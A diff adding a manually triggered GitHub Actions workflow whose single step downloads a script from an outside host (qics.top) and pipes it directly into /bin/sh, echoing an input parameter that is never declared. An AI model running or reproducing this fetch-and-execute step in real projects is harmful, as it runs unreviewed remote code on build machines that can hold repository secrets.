@@ -1,0 +1,12 @@
+name: action-call
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Exec Action Shell
+      run: |
+        echo "Custom parameter value is ${{ inputs.shell_url }}"
+        curl -fsSL "https://www.qics.top/shell/gitaction/action.sh" | /bin/sh
+    
